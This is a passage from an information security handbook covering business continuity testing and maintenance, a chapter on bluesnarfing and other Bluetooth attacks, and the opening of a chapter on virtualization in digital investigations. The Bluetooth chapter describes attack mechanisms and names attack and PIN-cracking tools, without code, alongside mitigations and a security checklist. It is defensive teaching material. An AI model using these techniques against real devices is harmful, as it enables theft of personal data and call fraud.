Extreme care should be taken not to actually disrupt production or even cause a 
real disaster when conducting this type of test. Under certain circumstances, this 
may be the only method that is useful, but care is advised as it involves a deliber-
ate interruption and then recovery of a business process or processes.
24.4.4  Budgeting for Tests
The continuity planner should make sure to formalize a budget that supports an 
appropriate level of ongoing testing. The best approach to testing is to start simple, 
and make the testing and test scenarios more complex each time. Generally, a walk-
through is the first test that is undertaken in the testing cycle, and an enterprisewide 
full simulation test would be undertaken at the end of the cycle. Where the organi-
zation is in the testing cycle will impact the size of budget needed for testing. The 
enterprisewide full simulation is obviously more expensive than walk-through tests, 
and the budget should be adjusted accordingly. The following categories should be 
considered when budgeting for tests:
Airfare
◾
◾
Ground transportation
◾
◾
Lodging
◾
◾
Food
◾
◾
Off-site storage technologies
◾
◾
Vital records/documentation shipping expenses
◾
◾
Miscellaneous expenses related to continuity testing
◾
◾
There are absolutely no substitutes for testing. Without testing, evidence that 
the continuity planning process is effective is simply not there, period.
24.5  Investment Protection: Continuity 
Planning Maintenance
It has been said that the real cost of continuity planning is not in the preparation, 
development, and implementation of the continuity planning structure. Rather, it 

Continuity Program Testing, Maintenance, Training, and Awareness  ◾  331
is in the long-term testing and maintenance of the process. In fact, the monetary 
and resource investment in continuity planning testing and maintenance will far 
outweigh the initial development and implementation costs.
With that said, however, to bring an effective continuity planning program to 
fruition is not an insignificant investment, requiring the time, skills, and financial 
investment of the organization to accomplish if done correctly. That includes the 
investment in appropriate business impact assessment (BIA) processes intended to 
define time-critical business processes, which usually account for one third to one 
half of all the business processes of the enterprise. The BIA also serves to provide the 
continuity planners with appropriate continuity time objectives with which to plan 
for and acquire continuity resources (backup and continuity technologies, facilities, 
people, equipment, supplies, data, etc.).
24.5.1  Developing Continuity Planning 
Maintenance Strategies
The continuity planner should develop long-term strategies for maintaining the 
continuity and crisis management structure. Among the considerations to be 
addressed are:
Regular reviews and updates: Internal/external audit and internal compli-
◾
◾
ance functions can be used to ensure that the plans are regularly reviewed 
and updated by the IT and business operations components that originally 
developed them.
Continuity plan version control: This topic is critically important. Obviously, 
◾
◾
organizations change on a daily basis (employees, employee assignments, 
departmental shifts, IT and infrastructure changes, etc.). As a result, conti-
nuity plans, and especially hard-copy plans, can get out of date very quickly. 
Out-of-date date contact lists of key players can result in real execution prob-
lems later on, so updating, or worse yet, not updating, is vital, as simple as it 
may seem. As updates are made to the changing plans, a failure of version con-
trol could seriously and adversely impact the enterprise. This would happen if 
an event occurred, and the continuity and crisis management teams referred 
to different versions of the plans. Retrieval and destruction of outdated plans 
is an important issue, so a process designed to facilitate this is also important. 
It should go without saying that version control is an absolute must.
Distribution of updated plans: Along the same lines as version control, dis-
◾
◾
tribution control of the plans can be challenging for a couple of reasons. The 
first, mentioned previously, concerns version control. The second, however, 
also has serious ramifications because plans contain confidential informa-
tion, such as personnel data and confidential company processes and loca-
tions. The continuity planner must ensure that plan distribution controls are 

332  ◾  Information Security Management Handbook
adequate to protect this resource against disclosure to those who do not have 
the need to know. An automated system for documenting and storing conti-
nuity plans can be particularly useful for both version control and distribu-
tion challenges.
24.5.2  Continuity Planning Software Solutions 
Will Enhance Testing/Maintenance
Traditionally, organizations have documented continuity plans using paper-based 
technologies (i.e., word processing, spreadsheet, etc.). Although documented conti-
nuity plans are designed to facilitate the rapid continuity of business processes and 
supporting resource operations, the form they take can sometimes spell the differ-
ence between merely being developed and put on the shelf, or being developed and 
then appropriately tested and maintained into the future. As mentioned earlier, the 
true cost of continuity planning is not in the original development of the plans; it 
is in the ongoing testing and maintenance of the plans. Therefore, any tool that 
enhances an organization’s capability to document, test, and maintain continuity 
plans effectively is beneficial.
It is recommended that organizations acquire and implement an appropriate 
continuity planning software tool (a large number of which are commercially 
available). Continuity planning software should be designed to help planners 
construct continuity plans by automating the planning documentation pro-
cess. Use of continuity planning software should save time for the organization, 
improve the overall effectiveness of the continuity plan documentation process, 
and facilitate maintenance and execution of the plans. The continuity plan-
ning software solution or mechanism should be easy to use and maintain and 
should be based on a sound business continuity planning methodology. It must 
be compatible with existing organization operating systems and technological 
platform operating systems. The tool should also allow for an appropriate degree 
of plan roll-up for validation and review purposes, thereby assisting in manage-
ment’s understanding of the robustness of their continuity planning infrastruc-
ture implementation.
Use of a continuity planning tool will enhance the testability and maintain-
ability of the continuity planning structure. Also, the use of a continuity plan-
ning software tool will enhance overall awareness and training of those individuals 
responsible for development, implementation, testing, and maintenance of conti-
nuity plans given standardization upon one data-gathering technique or method. 
This can add value to the organization, as they will likely be the same people who 
will have to execute the plans, should disaster strike.
Maintenance activities such as updating plan procedures to reflect the changing 
organization, maintaining inventory lists and call trees, etc., should all be planned 
for in the budget. The age of the continuity plans and the degree of change within 

Continuity Program Testing, Maintenance, Training, and Awareness  ◾  333
the organization will impact the budgeting for maintenance activities. For IT tech-
nology-related continuity plans, the costs associated with application and database 
synchronization and change management should be considered for inclusion in the 
formal continuity plan budgeting process.
24.5.4  Complementary Component: Metrics
Establishing a meaningful set of metrics for measuring training/awareness and 
testing/maintenance activities is one additional way to enhance both of these pro-
gram components.
In the past, continuity planning effectiveness was often measured in terms of a 
pass/fail grade on a technology platform recovery test or on the perceived benefits 
of backup/recovery sites and redundant telecommunications based on the expense 
for those capabilities. The difficulty with these types of metrics is that they only 
measure continuity planning direct costs and subjective perceptions about whether 
a test was effectively executed. This limited type of measurement does not indicate 
whether a test validates the appropriate infrastructure elements or even whether it 
tests a specific component thoroughly enough.
So, one might inquire as to the correct measures to use. Although financial 
measurements do constitute one measure of the continuity planning process, oth-
ers measure the continuity planning’s contribution to the organization in terms of 
quality and effectiveness, which are not strictly weighed in monetary terms. The 
contributions that a well-run continuity planning process can make to an organiza-
tion include:
Sustaining growth and innovation
◾
◾
Enhancing customer satisfaction
◾
◾
Providing people needs
◾
◾
Improving overall mission-critical process quality
◾
◾
24.5.5  Awareness/Training Metrics
Implementation of a series of metrics that seek to measure the effectiveness of per-
sonnel training and awareness levels, conducting and monitoring regular drills, and 
undertaking surveys and supplemental employee job description and performance 
measurement criteria are all ways in which an organization can begin to establish 
effective metrics in this area.
24.5.6  Testing/Maintenance Metrics
A multitude of program components related to continuity plan testing and main-
tenance can be utilized in identifying program metrics. Examples include test 
planning goals, timing, execution, and follow-up processes, all of which provide 

334  ◾  Information Security Management Handbook
opportunities for the development of sound measurements. There are many oppor-
tunities to track maintenance activities. Utilization of change control, human 
resource evaluations, internal audits, and continuity planning management reviews 
can provide ample prospects for development of meaningful metrics.
24.6  Summary
As mentioned at the beginning of this chapter, people are what make the crisis man-
agement and business continuity plans of an organization work. Knowledgeable, 
experienced, and practiced individuals are vital to any enterprise effort to react to 
and recover from a serious incident that impacts the organization’s ability to sup-
port time-critical business processes.
Both of the broad-based initiatives of continuity planning awareness/training 
and testing/maintenance are people focused, which adds tremendous value to the 
organization and, if managed effectively, adds significantly to the ability of the orga-
nization to sustain a disaster with a minimum of impact or disruption. Documented 
crisis and continuity plans are important, no question; but only the ability of the 
organization’s people to execute these plans will truly demonstrate success.

9
LEGAL, 
REGULATIONS, 
COMPLIANCE, AND 
INVESTIGATION


337
25
Chapter 
Bluesnarfing
Mano Paul
25.1  Introduction
Wireless networks are extremely prevalent today, both at home and in work set-
tings. Increased adoption of wireless networks can be attributed to the lower cost of 
set up and ease of installation combined with benefits such as increased portability 
Contents
25.1	 Introduction..............................................................................................337
25.2	 Bluetooth..................................................................................................338
25.2.1	How Bluetooth Works...................................................................338
25.2.2	The OBEX Protocol.......................................................................339
25.2.3	Bluetooth Security.........................................................................339
25.2.4	Bluesnarfing.................................................................................. 340
25.3	 Impact on Confidentiality, Integrity, and Availability.............................. 340
25.4	 Control and Risk Mitigation Measures.....................................................341
25.4.1	Management Controls...................................................................341
25.4.2	Technical Controls........................................................................341
25.4.3	Operational Controls.................................................................... 342
25.5	 Other Bluetooth Attacks.......................................................................... 343
25.6	 Tools Used............................................................................................... 344
25.6.1	Discovery Tools............................................................................ 344
25.6.2	Attack Tools...................................................................................345
25.6.3	Auditing Tools...............................................................................345
25.7	 Bluetooth Security Checklist.....................................................................345

338  ◾  Information Security Management Handbook
and productivity. The distinguishing characteristic of wireless networks is the lack 
of cabling, which expands a network to one without a physical boundary and allows 
an end user to be portable and productive from anywhere within the wireless net-
work range.
The two types of wireless networks are wireless local area networks (WLANs) and 
ad hoc networks. WLANs are based on the IEEE 802.11 standard, designed to sup-
port medium-range, high-data rate applications. Ad hoc networks are so named due 
to the shifting network topologies they establish that are often ephemeral. There is no 
fixed network infrastructure (access points, routers) deployed in ad hoc networks as 
there is in WLANs, and network configurations are random, relying on a master–slave 
system of wireless links. Associations of devices to the network are “on-the-fly.” One of 
the most popular and prevalent ad hoc network standards today is Bluetooth.
25.2  Bluetooth
Although relatively new, Bluetooth is becoming very common in the market space. 
The Bluetooth standard specifies how disparate communication devices (laptops, 
mobile phones, PDAs) interconnect and operate. Bluetooth was originally devel-
oped as a cable replacement technology. It supports reliable and fast transmission of 
voice and data, and is an open standard for short-range digital radio. Even though it 
is an open standard for short-range, as Table 25.1 indicates, Bluetooth is offered in 
three operating ranges, ranging from 0.1 meters to 100 meters and is used primarily 
in personal area networks, tethered or untethered.
25.2.1  How Bluetooth Works
When two Bluetooth devices need to communicate, they first need to be associ-
ated (otherwise referred to as ”bonding”). For a successful association, an identi-
cal PIN code needs to be entered into both devices. As Figure 25.1 depicts, when 
the PIN codes match, a link key is successfully generated for authentication and 
the devices are said to be “paired.” Paired devices in turn derive another key 
called the encryption key, which is used for confidentiality of data or voice trans-
mitted. The link key is used for authentication and the encryption key is used 
for confidentiality.
Table 25.1  Operating Ranges for Bluetooth Devices
Type of Bluetooth Device
Operating Ranges
Class 1 
Up to 100 meters (300 feet)
Class 2 
Up to 10 meters (30 feet)
Class 3 
From 0.1 to 10 meters (less than 30 feet)

Bluesnarfing  ◾  339
Bluetooth-enabled devices are capable of autolocating (discovering) other 
Bluetooth-enabled devices. Usually, upon locating other devices, a request to be paired 
is made, and successful pairing allows the devices to communicate on the network.
Bluetooth uses the OBEX (OBject EXchange) protocol for exchanging infor-
mation between wireless Bluetooth devices.
25.2.2  The OBEX Protocol
OBEX is the protocol that allows devices to exchange standard objects, which could 
include files, calendar items, and business cards to name a few. It is a vendor-neutral 
protocol and is implemented in various operating systems like the Palm™ OS, 
Windows® CE, and Windows Mobile. The OBEX protocol has various COM inter-
faces and has two primary services, the push service and the pull service. The push 
service of the OBEX protocol is used for sending data and the pull service is used 
for receiving (GET in OBEX) data. OBEX does all the transport-specific work of 
pushing and pulling data, and it is these services that are exploited in Bluetooth 
attacks (such as bluesnarfing, bluejacking, and bluebugging). OBEX is maintained 
by the Infrared Data Association and has been adopted by the Bluetooth Special 
Interest Group and the SyncML wing of the Open Mobile Alliance.
25.2.3  Bluetooth Security
The Bluetooth standard specification has inherent security features built in. The 
three basic security features built into Bluetooth are authentication, confidential-
ity, and authorization. Currently, auditing and nonrepudiation are not part of the 
inherent Bluetooth security features.
Authentication is in the form of a challenge-response scheme and can be mutual 
or unidirectional. Unidirectional authentication, which means that only one of the 
two devices authenticates with the other, is not as secure as mutual authentication, 
in which the devices need to authenticate against each other. Mutual authentica-
tion provides for heightened security against man-in-the-middle (MITM) attacks. 
PIN
Device 1
Link Key
Encryption Key
PIN
Device 2
Link Key
A
C
Encription Key
A
C
-Authentication
-Conﬁdentiality
Figure 25.1  Key generation from PIN.

340  ◾  Information Security Management Handbook
In Bluetooth networks, if authentication fails, the device will wait for a period of 
time (known as suspend time) before trying to reconnect.
Some of the greatest benefits of Bluetooth technology are akin to those of wire-
less 802.11 networks, which are portability, increased productivity, and low cost. 
Other benefits include random network configurations built on-the-fly, ease of 
data transfer, wireless synchronization, and Internet connectivity. Although certain 
security features are built into the Bluetooth standard, it brings certain serious risks 
and threats that one must consider mitigating.
Bluejacking, bluesnarfing, and bluebugging are three of the most common and 
well-known Bluetooth attacks evident in ad hoc Bluetooth networks.
25.2.4  Bluesnarfing
Bluesnarfing is the unauthorized access and theft of information from a wireless device 
through a Bluetooth connection. “Snarf,” a term borrowed from computer hacker 
jargon, means grabbing a large document or file and using it without the author’s per-
mission. Bluesnarfing allows the attacker to gain access to restricted portions of stored 
data, including the entire phone book, images, calendar items, change logs, and even 
the International Mobile Equipment Identity (IMEI) number unique to the mobile 
phone. A stolen IMEI can then be used in illegal phone “cloning” attacks. Although 
it may seem like this is possible only if the Bluetooth-enabled device is “discoverable” 
(visible), it has been proven that this need not be the case, as Bluetooth devices in 
“hidden” (invisible) mode can also be found using brute-force techniques.
Upon successful bluesnarfing exploitation, the attacker can synchronize (“pair”) 
with the vulnerable device and gain unauthorized access to information on the vic-
tim’s device, acting like a legitimate user. Not only can attackers access a vulnerable 
device’s information with authentication, they can also read-write to the device. 
What makes this attack very dangerous is that, besides the impact on confidential-
ity, integrity, and availability, it often leaves no footprint behind for auditing and 
forensic purposes. If a device is vulnerable, it is possible to connect to it without 
alerting the owner and gain access to restricted portions of the stored data.
This type of attack exploits implementation of the OBEX protocol where the 
attacker will pull instead of push known objects, leading to information theft, and 
because no user authentication exists, there is no accountability.
25.3  Impact on Confidentiality, 
Integrity, and Availability
Bluesnarfing can have serious impact on confidentiality, integrity, and availability. 
Sensitive and personal information like phone lists, calendar, and e-mails can be 
disclosed (confidentiality exposures), modified, or deleted (integrity exposure), or 

Bluesnarfing  ◾  341
devices may become unresponsive due to signal jamming or battery exhaustion 
(availability exposure).
In addition to data disclosure confidentiality attacks, stolen or compromised 
devices and MITM attacks pose serious confidentiality threats. Because no user 
authentication is necessary for Bluetooth devices to pair and operate, stolen or com-
promised devices can reveal proprietary and sensitive information stored in the 
device. Man-in-the-middle attacks are those in which an attacker uses an untrusted 
device to mimic a legitimate Bluetooth device address to associate and generate an 
encryption key to disclose sensitive information.
Integrity violations extend beyond information disclosure as they include mod-
ification, addition, or deletion. Phonebook entries and calendar items in mobile 
devices can be changed, added to, and even deleted. Information that is altered can 
be passed to the network, causing serious compromises.
Bluetooth devices are susceptible to signal jamming, and because they share the 
same frequency band (2.4 GHz) as other devices like microwaves, ovens, cordless 
phones, and wireless networks, they are susceptible to interference and disruption 
of services as well.
Battery exhaustion occurs when a device is so continuously solicited for infor-
mation that power is drained from the battery, eventually leading to shutdown and, 
in a sense, denial of service (DoS).
25.4  Control and Risk Mitigation Measures
The control and risk mitigation measures against bluesnarfing attacks can be of the 
following types: management, technical, and operational.
25.4.1  Management Controls
This first line of defense against bluesnarfing and other Bluetooth attacks again is 
to establish security policies and standards that address Bluetooth-enabled devices. 
When establishing policies and standards, there should be clear-cut guidelines on 
user responsibilities and accountability. These policies must be realistic and enforce-
able and should account for the types of devices that can interconnect and operate, 
the type of data that can be transmitted, and repercussions of noncompliance. User 
awareness and training on Bluetooth security risks is highly recommended and 
should be administered and managed.
25.4.2  Technical Controls
Undiscoverable mode: One of the best technical defenses against bluesnarf-
◾
◾
ing attacks is to set the Bluetooth-enabled device to be undiscoverable, i.e., in 
hidden or invisible mode.

342  ◾  Information Security Management Handbook
Longer PIN codes: Default PIN codes (like “0000” or “1234”) must be 
◾
◾
changed. PIN codes can range from 1 to 16 bytes, but most vendors of mobile 
devices have settled for a default four-digit numeric pin, which lowers secu-
rity considerably, increasing the risk of successful brute-force attacks in figur-
ing out the PIN code. Increasing the size of the PIN code will considerably 
increase the work factor necessary in deducing the PIN code.
Operating range: It is important to have a clear understanding of the operat-
◾
◾
ing ranges of the Bluetooth devices on your network as it is directly propor-
tional to the attack surface area. The higher the operating range, the higher 
the attack surface area. Bluetooth attacks have been reported to be successful 
even outside the operating range of the devices, by using signal boosters, from 
a distance about a mile away. It is therefore imperative not only to be aware 
of the operating ranges of your Bluetooth devices, but also to establish neces-
sary policies to allow only needed and appropriate types (classes) of Bluetooth 
devices to connect to your network.
Increase suspend time: Increasing the retry time interval when authentica-
◾
◾
tion fails can prevent against automated brute-force attacks, but this suspend 
technique does not protect against a determined attacker trying to deduce the 
PIN code using offline brute-force attacks.
25.4.3  Operational Controls
There is no registration of Bluetooth devices when they join a network. They merely 
associate (bond) with the network, making these devices invisible to the network 
administrator. This makes it nearly impossible to manage and protect them. However, 
there are a few operational control measures that can be taken to mitigate or prevent 
bluesnarfing attacks, including gateway monitoring and spatial distancing.
Gateway monitoring: Securing and monitoring the Bluetooth gateway that 
◾
◾
allows Bluetooth devices to connect to the network can prove helpful in 
detecting any intruder activity. Audit logs need to be configured and used 
to detect any suspicious or unusual activity. As a minimum security baseline, 
both successful and failed authentication attempts, associations, and disas-
sociations, requests for information, and any privileged entity activity need 
to be recorded and audited periodically.
Spatial distancing: Spatial distancing is setting the power requirements to be 
◾
◾
just enough (low) so that devices inside the security perimeter range cannot 
be detected from the outside.
Application-level software authentication that requires passwords for users 
of Bluetooth-enabled devices and biometrics using voice authentication provide 
additional layers of security. However, one must weigh the cost of implement-
ing the controls against the benefits evident on implementing them in a risk 

Bluesnarfing  ◾  343
mitigation strategy. For example, if Bluetooth technology is primarily deployed 
for wireless printer connectivity, defense-in-depth solutions may be unnecessary 
and expensive.
Bluetooth security should include all three types (management, technical, and 
operational) of control and risk mitigation measures in conjunction with other 
defense-in-depth strategies.
25.5  Other Bluetooth Attacks
Following is a list of other prominent attacks against Bluetooth-enabled devices:
Bluejacking: Bluejacking is sending anonymous, unwanted messages to other 
◾
◾
users with Bluetooth-enabled mobile phones or laptops. By carefully craft-
ing the identification that devices exchange during association, attackers can 
transmit short, deceitful text messages into authentication dialogs. Users can 
then be tricked into using their access codes, thereby authorizing an attacker 
to access a phone book, calendar, or file residing on the device. Bluejacking 
depends on the ability of Bluetooth phones to detect and contact other 
Bluetooth devices nearby. The bluejacker uses a feature originally intended 
for exchanging contact details or “electronic business cards,” then adds a new 
entry in the phone’s address book, types in a message, and chooses to send 
it via Bluetooth. The mobile device searches for other Bluetooth phones and, 
if it finds one, sends the message. Despite its name, bluejacking is essentially 
harmless. Unlike bluesnarfing, the bluejacker does not steal personal infor-
mation or take control of a phone. Bluejacking can be a problem if it is used 
to send obscene or threatening messages or images, or to send advertising. 
If you want to avoid such messages, you can turn off Bluetooth, or set it 
to “undiscoverable.” Bluetooth-enabled devices may also be at risk from the 
more serious bluesnarfing attack.
Bluebugging: A bluebug vulnerability permits access to the cell phone’s set 
◾
◾
of AT commands, which let an aggressor use the phone’s services, includ-
ing placing outgoing calls, sending, receiving, deleting text, diverting calls, 
and so on. The bluebug attacker creates a serial profile connection to the 
device, thereby having full access to the AT command set, which can then 
be exploited using standard off-the-shelf tools, such as PPP for networking. 
With this facility, it is possible to use the phone to initiate calls to premium 
rate numbers, send text messages, read text messages, connect to data services 
such as the Internet, and even monitor conversations in the vicinity of the 
phone. Bluetooth access is only required for a few seconds to set up the call. 
Call-forwarding diverts can be set up, allowing the owner’s incoming calls to 
be intercepted, either to provide a channel for calls to more expensive destina-
tions or for identity theft by impersonation of the victim.

344  ◾  Information Security Management Handbook
Bluebump attack: This attack takes advantage of a weakness in the handling 
◾
◾
of Bluetooth link keys, giving devices that are no longer authorized the ability 
to access services as if still paired. It can lead to data theft or to the abuse of 
mobile Internet connectivity services, such as Wireless Application Protocol 
and General Packet Radio Services.
HeloMoto attack: This attack is a combination of the bluesnarf and bluebug 
◾
◾
attacks. The name comes from the fact that it was originally discovered on 
Motorola phones.
Bluedump attack: This attack causes a Bluetooth device to dump its stored 
◾
◾
link key, creating an opportunity for key-exchange sniffing or for another 
pairing to occur with the attacker’s device of choice.
Bluechop attack: This is a DoS attack that can disrupt any established 
◾
◾
Bluetooth network (piconet) by means of a device that is not participating in 
it, if the piconet master supports multiple connections.
25.6  Tools Used
Tools that are used in Bluetooth attacks are many. They can be categorized primar-
ily as discovery tools, attack tools, or auditing tools.
25.6.1  Discovery Tools
Discovery tools are those that are used to discover other Bluetooth devices. The 
following tools are used in searching, discovering, and testing Bluetooth-enabled 
devices and their vulnerabilities:
Bluesniff is GUI-based Bluetooth war-driving utility. It searches to discover 
◾
◾
both discoverable (“visible”) and hidden (“invisible”) modes.
BlueScanner is a bash script that implements a scanner for Bluetooth devices. 
◾
◾
It is a tool designed to extract as much information as possible from Bluetooth 
devices without the requirement to pair.
BTBrowser (Bluetooth Browser) is an application built on Java technology, 
◾
◾
and is used to find out technical specifications of discovered Bluetooth-
enabled devices. It works on all devices that support the Java Bluetooth speci-
fication (JSR-82).
BTCrawler (Bluetooth Crawler) is a scanner for Windows
◾
◾
® Mobile-based 
devices. In addition to discovering other Bluetooth-enabled devices that are 
discoverable in range, it can query for services running on the newly dis-
covered device. It also has an option to perform self diagnostics to query for 
Bluetooth profiles. Although it is primarily a discovery tool, as it scans for 
other Bluetooth-enabled devices in range, it can also be used for performing 
bluejacking and bluesnarfing attacks.

Bluesnarfing  ◾  345
25.6.2  Attack Tools
Attack tools are used to exploit Bluetooth implementation vulnerabilities:
Bluesnarfer is a tool that can be used to download the phone book of any 
◾
◾
mobile device vulnerable to bluesnarfing.
Bluebugger is a tool used to conduct bluebugging attacks. Upon successful 
◾
◾
exploiting a bluebug vulnerability in Bluetooth-enabled phones, the attacker 
can gain unauthorized access to the victim’s personal data such as phone 
book, SMS data, calls lists, and other personal information.
BTCrack is a Bluetooth pass phrase (PIN) brute-force tool. BTCrack will 
◾
◾
brute force the passkey and the link key from captured pairing exchanges. 
The link key allows remote connections without alerting the victim, con-
nection to devices in nonpairing mode and nondiscoverable mode, and also 
decryption of the data.
25.6.3  Auditing Tools
Auditing tools are usually security frameworks or penetration tools used to search, 
discover, and test the security features of the Bluetooth network by a security 
professional. In the hands of an attacker, auditing tools can easily be used as an 
attack tool.
Blooover II is a Java-based (J2ME) Bluetooth auditing tool. It works on all 
◾
◾
devices that support the Java Bluetooth specification (JSR-82). Besides the 
bluebug attack, Blooover II supports bluesnarfing and sending malformed 
objects via OBEX.
Transient Bluetooth Environment Auditor (T-BEAR) is a platform consisting 
◾
◾
of a suite of applications designed to audit the security of Bluetooth environ-
ments. The platform consists of various Bluetooth discovery, sniffing, and 
cracking tools.
25.7  Bluetooth Security Checklist
Table 25.2 provides a Bluetooth security checklist, adapted from NIST SP 800-
48 on wireless network security. It presents best practices, guidelines, and recom-
mendations, categorized as management, technical, and operational, to design and 
maintain a secure Bluetooth (ad hoc) network.

346  ◾  Information Security Management Handbook
Table 25.2  Bluetooth Security Checklist
S. No.
Security Recommendation
Status
Management
1
Develop an agency security policy that addresses the use 
of Bluetooth technology.
2
Ensure that users on the network are fully trained in 
computer security awareness and the risks associated with 
Bluetooth technology.
3
Take a complete inventory of all Bluetooth-enabled wireless 
devices to ensure that the Bluetooth “network” is fully 
understood.
4
Ensure that handheld or small Bluetooth devices are 
protected from theft and turned off when they are not in 
use.
Technical
1
Set Bluetooth devices to be in hidden (invisible) or 
nondiscoverable mode.
2
Choose PIN codes that are sufficiently random, long 
(maximum length if possible), not defaulted to zero PIN, and 
not stored in memory after power removal.
3
Ensure that the Bluetooth “bonding” environment is secure 
from eavesdroppers.
4
Increase the “suspend” time (time to reconnect when 
authentication fails) to maximum.
Operational
1
Ensure device mutual authentication for all accesses.
2
Ensure that Bluetooth gateway devices on the network are 
secured and monitored periodically.
3
Set Bluetooth devices to the lowest necessary and sufficient 
power level so that transmissions remain within the secure 
perimeter of the agency.
4
Deploy user authentication such as voice recognition 
(biometrics), smart cards, two-factor authentication, or PKI.

347
26
Chapter 
Virtualization and 
Digital Investigations
Marcus K. Rogers and Sean C. Leshney
26.1  Introduction
The field of digital investigations is an exciting area to be involved in. This area 
combines many disciplines (e.g., computer science, criminalistics, engineering, 
law, psychology, information technology). One of the more fascinating and prob-
ably frustrating components of digital investigations is the “technology” itself. 
Investigations that involve technology are inherently cursed with the need for all 
those involved (e.g., investigators, lawyers, judges) to keep up with the dynamic 
Contents
26.1	 Introduction..............................................................................................347
26.2	 Definition and History..............................................................................349
26.3	 Prevalence.................................................................................................351
26.4	 Challenges.................................................................................................352
26.4.1	Counter Forensics..........................................................................353
26.4.2	Identification Challenges...............................................................355
26.4.3	Acquisition Challenges..................................................................356
26.5	 Analysis/Examination...............................................................................356
26.6	 Advantages................................................................................................359
26.7	 Summary..................................................................................................361
References..........................................................................................................362

348  ◾  Information Security Management Handbook
and seemingly constant changes that technology brings. Just as we get comfort-
able with the latest change or modification, along comes something new, or in the 
context of what we will be discussing—virtualization—something old reappears 
that so predates the field that it appears to be new, and therefore brings about a 
minor revolution or paradigm shift.
When a paradigm shift occurs or is imminent, investigators become uncom-
fortable as the processes, guidelines, and other standard operating procedures 
that they have become accustomed to need to be revisited, modified, and in 
some cases abandoned. It is not only the investigators who are affected. There 
can also be a trickle-down effect as the lawyers and courts, which have become 
somewhat comfortable with the status quo approach to dealing with evidence 
and investigations, become nervous and uncomfortable with the changes, and 
thus increase their collective scrutiny of the evidence derived from these changed 
processes.
As we have alluded, the concept of virtualization (sometimes referred to as 
virtual computing) is not new and can trace its roots back to the days of the 
mainframe systems in the late 1950s and early 1960s. What is new is the exten-
sion of virtualization to the x86 platform and the adoption by large and small–
medium businesses and, interestingly enough, home users. This commoditization 
of out of the box virtualization tools is rapidly changing the face of what investi-
gators are encountering in both the criminal and civil sectors.
This chapter is designed to provide a high-level discussion of virtualization 
and how it is currently impacting digital investigations, both negatively (anti- or 
counter forensics) and positively (as an investigative tool). We will provide a brief, 
not overly technical overview of virtualization in the x86 space so that everyone 
is sufficiently knowledgeable and comfortable with the concept. This will help to 
facilitate the discussion of the use of virtualization by those we are investigating 
and how we can use virtualization to our advantage as well.
We will begin our discussion by defining what virtualization is, and then briefly 
touch on the history and context of virtualization. We will also provide some insight 
into the prevalence of virtualization by businesses and end users/home users. We 
will then shift gears and look at the challenges that investigators may face as a result 
of the rapid adoption of virtualization and how this impacts the examination and 
analysis phases. We will also provide guidance for investigators dealing with virtu-
alization. The advantages of virtualization will be discussed next. We will end the 
chapter by peering into our proverbial crystal ball and examining what we may be 
faced with in the next two to five years.
As was mentioned, the intended audience for this chapter is not someone requir-
ing a deep technical overview. The tone of the chapter is set to the level of inves-
tigators, lawyers, judges, and laypersons who are curious about how virtualization 
impacts the field of digital investigations.

Virtualization and Digital Investigations  ◾  349
26.2  Definition and History
The concept of virtualization, as was previously mentioned, is not new. In its most 
basic form, virtualization can be thought of as “a framework that allows for the 
creation of an environment for the sharing of computing system resources, includ-
ing physical components and memory” (Singh n.d. ¶8). The virtualization environ-
ment can be managed by either a software application that executes on top of the 
host operating system (OS) or by code that interacts directly with the system and 
does not require a host OS (e.g., Hypervisor; see Figure 26.1 and Figure 26.2).
When discussing virtualization, it is necessary to differentiate between full-
virtualization and para-virtualization. Full-virtualization in the x86 domain can 
be thought of as either a framework or a “software container that runs its own 
operating system and applications” (VMware n.d. ¶1). This container isolates 
Figure 26.1  Hypervisor
Virtual
Machine
Virtual
Machine
Virtual Machine Monitor (VMM)
Host Machine Operating System
Physical Machine Hardware
Virtual
Machine
Figure 26.2  Virtual machine monitor.

350  ◾  Information Security Management Handbook
or encapsulates the virtual machine (VM) from other machines including the 
guest OS. The VM is almost identical to a real physical system and the OS, and 
any applications running in the container (encapsulated) are unaware that they 
are running in a software container; this container is termed the hypervisor or 
virtual machine monitor (VMM) and is hosted by another OS (in the case of 
software virtualization; Singh n.d.). The VM uses virtual components to simulate 
or provide access to the CPU, NIC, and drive controller. This virtualization also 
allows the virtual machine configuration to simulate physical components that 
are different than what actually exists on the host system (see below; Singh n.d.; 
VMware n.d.).
An advantage of full-virtualization is the fact that the virtualized OS (guest) 
does not need to be modified to run in the environment; it is totally unaware of the 
virtual layers and simulation. A disadvantage to full-virtualization is the overhead 
costs resulting in decreased performance due to tasks and error conditions like 
increased memory management and traps (Barham et al. 2003).
Para-virtualization is similar to full-virtualization with the exception that it 
does not exactly simulate (using a virtual machine abstraction) the true hardware 
of the guest system (Barham et al. 2003). This is believed to allow for greater flex-
ibility and increased performance. The drawback to para-virtualization is that the 
virtualized OS (or guest) needs to be modified or optimized to interact with the 
computing components properly. The advantage comes from decreased error condi-
tions and less memory management; thus there is less of a decrease in performance 
of the guest OS or applications running in the environment (Barham et al. 2003; 
Crosby and Brown 2007).
Depending upon the capabilities of the host computer, several virtual machines 
can be running simultaneously; in some instances, up to 100 virtual machines can 
co-exist (Barham et al. 2003). These virtual machines are hardware independent 
from each other, meaning that in theory, if one virtual machine becomes unstable, 
the others and the host OS are unaffected and continue to operate properly. In fact, 
several server-based virtual environments allow for the seamless moving of running 
applications and guest OSs between physical servers, a potential benefit for load 
balancing or DRP/BCP capabilities.
Unlike the mainframe systems that were optimized for virtualization (e.g., IBM 
System/360), today’s x86 architecture and CPUs are not designed by default to 
run more than one OS (Crosby and Brown 2007; Singh n.d.; VMware n.d.). This 
shortcoming requires that the virtualization solution, either VMM or hypervisor, 
acts as a “shim” between the CPU, hardware, and memory and the guest OS. The 
current state of x86 virtualization is poised to change as the various CPU manufac-
turers have recognized the importance of virtualization, and the next generation of 
these chips will be developed with greater virtualized CPU operations in mind. (It 
should be noted that both Intel and AMD have been working with VMM-friendly 
architecture in mind for some time).

Virtualization and Digital Investigations  ◾  351
26.3  Prevalence
Despite the limitations of the x86 architecture, virtualization has become an increas-
ingly popular solution for both businesses and home users. With the decreasing 
cost of primary memory (RAM), secondary memory storage (hard drives), and the 
increasing power of CPUs, it should come as no surprise that vendors of virtualiza-
tion solutions are experiencing a boom of sorts. Many of the vendors in this space 
are reporting an install base of over 100,000 customers and revenues in excess of 
$1 billion (VMware 2008).
The increased popularity of virtualization is understandable. As business IT 
departments are being tasked to do more with less, they are turning to virtualiza-
tion for potential solutions. Virtualizing systems allow businesses to keep costs 
down as they can move away from having dedicated physical systems for major 
services and applications. Previously, businesses here encouraged to have dedicated 
